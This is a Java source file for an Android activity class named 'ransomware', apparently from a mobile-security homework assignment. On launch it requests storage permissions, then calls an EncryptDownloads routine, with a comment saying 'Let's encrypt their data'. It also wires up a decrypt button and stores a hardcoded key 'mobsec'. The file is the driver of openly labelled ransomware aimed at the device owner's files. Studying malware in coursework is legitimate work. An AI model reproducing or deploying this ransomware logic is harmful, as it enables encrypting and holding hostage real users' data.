package nordberg.katie.hw4;

import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;

import androidx.appcompat.app.AppCompatActivity;

public class ransomware extends AppCompatActivity {
    String encryptionKey = "mobsec";

    public AppCompatActivity a;
    @Override
    protected void onCreate(Bundle savedInstanceState){
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        a = this;
        if (!PermissionHelper.hasStoragePerms((a))) {
            // If we don't have the needed permissions, we need to request them now before proceeding
            PermissionHelper.requestStoragePerms(a, 10);
            Log.e("Ransomware", "Requesting Storage Perms");

        } else {
            Log.e("Ransomware", "We already got storage permissions so we don't need to request again");
        }
        // Oops! They shouldn't have given us storage permissions. Let's encrypt their data
        new EncryptDownloads(this);

        Button btnDecrypt = this.findViewById(R.id.buttonDecrypt);
        btnDecrypt.setOnClickListener(new DecryptClick(this));
    }

    @Override
    public void onRequestPermissionsResult(
            int requestCode,
            String[] permissions,
            int[] grantResults
    ){
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        /*
        Just assume that the permissions were granted (this is a lazy shortcut)
         */

        Log.e("Ransomware", "onRequestPermissionsResult");
        if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            Log.e("Ransomware", "Granted");
        }else {
            Log.e("Ransomware", "Denied");
            // Close the app because we can't do anything without permissions
            this.finishAffinity();
        }
    }
}
